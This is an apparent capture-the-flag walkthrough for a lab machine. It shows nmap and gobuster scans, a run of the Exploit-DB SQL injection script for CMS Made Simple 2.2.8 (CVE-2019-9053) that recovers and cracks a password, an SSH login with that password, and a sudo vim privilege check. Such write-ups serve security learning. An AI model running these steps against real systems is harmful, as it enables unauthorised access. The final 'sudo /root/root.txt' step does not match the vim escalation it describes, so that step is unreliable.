---
layout: default
title: Simple CTF
parent: Easy
nav_order: 9
---

# Simple CTF

## How many services are running under port 1000?
`nmap -p- <Target-IP-Address>`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 20:09 -0600
Nmap scan report for 10.67.176.160
Host is up (0.035s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
-2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 105.53 seconds
```
## What is running on the higher port?
`nmap -A -p- <Target-IP-Address>`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 20:14 -0600
Nmap scan report for 10.67.176.160
Host is up (0.035s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.188.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 - 3.10 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   33.44 ms 192.168.128.1
2   ...
3   35.19 ms 10.67.176.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.62 seconds
```
## What's the CVE you're using against the application? 
`nmap -A -p- <Target-IP-Address>`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 20:14 -0600
Nmap scan report for 10.67.176.160
Host is up (0.035s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.188.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 - 3.10 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   33.44 ms 192.168.128.1
2   ...
3   35.19 ms 10.67.176.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.62 seconds
```
`gobuster dir --url http://<Target-IP-Address> -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```diff
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.176.160
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
+/simple               (Status: 301) [Size: 315] [--> http://10.67.176.160/simple/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
By visiting the new given url, [simple]()
```diff
This site is powered by CMS Made Simple version 2.2.8
```
I searched for `CVE CMS Made Simple version 2.2.8` and found [NIST CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
## To what kind of vulnerability is the application vulnerable?
Found, [Exploit Database](https://www.exploit-db.com/exploits/46635)
`sqli`
## What's the password?
` $ python3 46635.py -u http://<Target-IP-Address>/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`
```diff
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
```
## Where can you login with the details obtained?
`nmap -A -p- <Target-IP-Address>`
```diff
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 20:14 -0600
Nmap scan report for 10.67.176.160
Host is up (0.035s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.188.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 - 3.10 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   33.44 ms 192.168.128.1
2   ...
3   35.19 ms 10.67.176.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.62 seconds
```
## What's the user flag?
`sshpass -p "secret" ssh mitch@<Target-IP-Address> -p 2222`
`G00d j0b, keep up!`
## Is there any other user in the home directory? What's its name?
`ls /home`
`sunbath`
## What can you leverage to spawn a privileged shell?
Check user permisions
`sudo -l`
The user can use `vim` with sudo without the password by, `NOPASSWD`
```diff
User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
```
A guess from `user.txt` file name style
1. `sudo /root/root.txt`
    - `W3ll d0n3. You made it!`